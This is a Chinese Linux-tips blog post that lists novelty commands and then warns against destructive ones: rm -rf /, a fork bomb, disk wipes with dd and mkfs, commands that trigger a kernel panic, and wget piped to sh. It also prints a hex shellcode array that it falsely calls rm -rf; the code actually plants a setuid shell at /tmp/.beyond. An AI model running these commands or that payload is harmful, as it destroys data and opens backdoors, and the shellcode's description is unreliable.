# Linux 新手必会的21条命令合集 - qq_42302962的博客 - CSDN博客
2018年06月14日 09:57:54[Linux高级开发](https://me.csdn.net/qq_42302962)阅读数：142
Linux初期的学习曲线有些陡峭，所以作为一名初学者，学会自娱自乐是非常重要的。先来看13个有趣的小命令。
1.sl 命令
你会看到一辆火车从屏幕右边开往左边。。。。。。
安装 $ sudo apt-get install sl运行 $ sl
命令有 -alFe几个选项，
-a An accident seems to happen. You'll feel pity for people who cry for help.-l shows little one.-F It flies.-e Allow interrupt by Ctrl+C.
![Linux 新手必会的21条命令合集](http://p1.pstatp.com/large/pgc-image/1528794153191391eec8f12)
可以给别人来个恶作剧，他一敲ls，不知道的肯定很有效果
$alias ls=sl
2.fortune 命令
输出一句话，有笑话，名言什么的 (还有唐诗宋词sudo apt-get install fortune-zh)
安装 $sudo apt-get install fortune运行 $fortune
![Linux 新手必会的21条命令合集](http://p3.pstatp.com/large/pgc-image/1528794153182afff2857b5)
3.cowsay 命令
用ASCII字符打印牛，羊等动物，还有个cowthink，这个是奶牛想，那个是奶牛说，哈哈，差不多
安装 $sudo apt-get install cowsay运行 $cowsay "I am not a cow, hahaha"
![Linux 新手必会的21条命令合集](http://p1.pstatp.com/large/pgc-image/15287941530126b82ceb5a6)
$cowsay -l 查看其它动物的名字，然后-f跟上动物名，如$cowsay -f tux "坑爹啊"
![Linux 新手必会的21条命令合集](http://p9.pstatp.com/large/pgc-image/1528794153363e1556b4700)
还可以让cowsay说出fortune的内容，就像这样：
$fortune | cowsay
![Linux 新手必会的21条命令合集](http://p9.pstatp.com/large/pgc-image/1528794153363e1556b4700)
4.cmatrix 命令
这个很酷！《黑客帝国》那种矩阵风格的动画效果
安装 $ sudo apt-get install cmatrix运行 $cmatrix
![Linux 新手必会的21条命令合集](http://p9.pstatp.com/large/pgc-image/1528794153363e1556b4700)
5.figlet 、toilet命令
艺术字生成器，由ASCII字符组成，把文本显示成标题栏。此外还有banner这个命令
安装 $sudo apt-get install figlet$sudo apt-get install toilet运行 $figlet fuck you !$toilet i love you
![Linux 新手必会的21条命令合集](http://p3.pstatp.com/large/pgc-image/15287941532440a31d2536d)
toilet还可以添加颜色，里面的选项请自己man一下
$ toilet -f mono12 -F gay a girl
![Linux 新手必会的21条命令合集](http://p1.pstatp.com/large/pgc-image/15287941532005c7e989f00)
6.oneko 命令
桌面上出现一直喵星人，跟着你的鼠标跑，你不动了它就睡觉。哈哈，这个挺不错
安装 $sudo apt-get install oneko运行 $oneko 要关掉这家伙，按ctrl+c 结束
![Linux 新手必会的21条命令合集](http://p9.pstatp.com/large/pgc-image/1528794153363e1556b4700)
7.xeyes 命令
在屏幕上出现一双眼睛，盯着你的鼠标指针
安装运行同上
![Linux 新手必会的21条命令合集](http://p9.pstatp.com/large/pgc-image/1528794153363e1556b4700)
8.yes 命令
输出无穷无尽的字符,按ctrl+c结束，如
$yes 我很NB
9.cal 9 1752
cal是打印日历，不过这个是很奇葩的一个月，
![Linux 新手必会的21条命令合集](http://p9.pstatp.com/large/pgc-image/1528794153363e1556b4700)
10.shred
覆盖搞乱文件，就是文档粉碎，哈哈，要把你私藏的大片种子和电影销毁，不被恢复出来，就靠它了
11.factor
分解因数，这个。。。小学生可以用一下
![Linux 新手必会的21条命令合集](http://p1.pstatp.com/large/pgc-image/152879415323673deddc624)
12.挨个敲下面这一堆, aptitude没有的可以安装上
aptitude mooaptitude -v mooaptitude -vv mooaptitude -vvv mooaptitude -vvvv mooaptitude -vvvvv mooaptitude -vvvvvv mooaptitude -vvvvvvv moo
13.free the fish
桌面游过一条鱼...
alt+f2 输入free the fish
那么，继续！
# 14.rm -rf /
和大多数 Linux 命令一样，rm 这个核心命令使用起来非常方便。即便是最顽固的文件它也能帮你删除。结合起后面两个参数理解 rm 指令时，你很容易陷入大麻烦：-r，强制递归删除所有子目录，-f，无需确认，强制删除所有只读文件。如果你在根目录运行这条指令，将清除整个驱动器上的所有数据。
然后，当文件化为乌有时其中也包括了公司的视频。幸运的是，在疯狂敲击 control -C 后，在删除太多文件之前，系统管理员中止了这条命令。但这是对你的警告：任何人都可能犯这样的错误。
事实上，绝大部分现代操作系统都会在你犯这些错误之前，用一段醒目的文字警告你。然而，如果你在连续敲击键盘时忙碌或是分心，你将会把你的系统键入一个黑洞。（LCTT 译注：幸运的是，可能在根目录下删除整个文件系统的人太多了额，后来 rm 默认禁止删除根目录，除非——你手动加上 –no-preserve-root 参数！）
这里有一些更为隐蔽的方式调用 rm -rf。思考一下下面的代码：
char esp[] __attribute__ ((section(“.text”))) = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”“\x6e\x2f\x73\x68\x00\x2d\x63\x00”“cp -p /bin/sh /tmp/.beyond; chmod 4755/tmp/.beyond;”;
这是什么？这是 16 进制的 rm -rf 写法。在你不明确这段代码之前，请千万不要运行这条命令！
# 15.fork 炸弹
既然我们讨论的都是些奇怪的代码，不妨思考一下这一行：
:(){ :|: & };:
对你来说，这可能看起来有些神秘，但是我看来，它就是那个臭名昭著的 Bash fork 炸弹。它会反复启动新的 Bash shell，直到你的系统资源消耗殆尽、系统崩溃。
不应该在最新的 Linux 系统上做这些操作。注意，我说的是不应该。我没有说不能。正确设置用户权限，Linux 系统能够阻止这些破坏性行为。通常用户仅限于分配使用机器可用内存。但是如果作为 root 用户的你运行了这行命令（或者它的变体 Bash fork 炸弹变体），你仍然可以反复虐待服务器，直到系统重启了。
# 16.垃圾数据重写硬盘
有时候你想彻底清除硬盘的数据，你应该使用 Darik’s Boot and Nuke （DBAN） 工具去完成这项工作。
但是如果仅仅想让你的存储器乱套，那很简单：
任意命令 > /dev/hda
我说的“任意命令”，是指有输出的任意命令，比如:
ls -la > /dev/hda
……将目录列表通过管道送到你的主存储设备。给我 root 权限和足够的时间，就能覆盖整个硬盘设备。这是让你开始盲目恐慌的一天的好办法，或者，可以把它变成职业禁入方式。
# 17.擦除硬盘！
另一个一直受欢迎的擦除硬盘的方式是执行：
dd if=/dev/zero of=/dev/hda
你可以用这条命令写入数据到你的硬盘设备。dd 命令可以从特殊文件中获取无尽个 0 字符，并且将它全部写入你的设备。
# 18./dev/null 的损失
另一个毁灭你的存储设备的方式，运行 mv / /dev/null 或者 >mv /dev/null。
在前一种情况下，你作为 root 用户，把整个磁盘数据都送进这个如饥似渴的 /dev/null。在后者，你仅仅把家目录喂给这个空空如也的仓库。任何一种情况下，除非还原备份，你再也不会再看见你的数据了。
# 19.格式化错了驱动器
有时候你需要使用这一条命令格式化驱动器：
mkfs.ext3 /dev/hda
……它会用 ext3 文件系统格式化主硬盘驱动器。别，请等一下！你正在格式化你的主驱动器！难道你不需要用它？
当你要格式化驱动器的时候，请务必加倍确认你正在格式化的分区是真的需要格式化的那块而不是你正在使用的那块，无论它们是 SSD、闪存盘还是其他氧化铁磁盘。
# 20.内核崩溃
一些 Linux 命令不能让你的机器长时间停机。然而，一些命令却可以导致内核崩溃。这些错误通常是由硬件问题引起的，但你也可以自己搞崩。
当你遭遇内核崩溃，重新启动系统你才可以恢复工作。在一些情况下，这只是有点小烦；在另一些情况下，这是一个大问题，比如说，高负荷运作下的生产环境。下面有一个案例：
dd if=/dev/random of=/dev/portecho 1 > /proc/sys/kernel/paniccat /dev/portcat /dev/zero > /dev/mem
这些都会导致内核崩溃。
绝不要运行你并不了解它功能的命令，它们都在提醒我…
# 21.提防未知脚本
年轻或是懒惰的系统管理员喜欢复制别人的脚本。何必重新重复造轮子？所以，他们找到了一个很酷的脚本，承诺会自动检查所有备份。他们就这样运行它：
wget https://ImSureThisIsASafe/GreatScript.sh -O- | sh
这会下载该脚本，并将它送到 shell 上运行。
你认为你不会干那样的事？告诉我，所有那些 你在 Docker 里面运行的容器镜像在干什么？你知道它们到底在运行着什么吗？我见过太多的没有验证容器里面装着什么就运行它们的系统管理员。请不要和他们一样。
# 结束
我有没有遗漏什么？在 @sjvn 或 @enterprisenxt 上告诉我哪些 Linux 命令在你的“绝不要运行！”的清单上。
参考资料：
http://www.cnblogs.com/sukai/archive/2013/06/08/3127031.html
https://linux.cn/article-9206-1.html
每天会更新论文和视频，还有如果想学习c++知识在晚上8.00免费观看这个直播：https://ke.qq.com/course/131973#tuin=b52b9a80
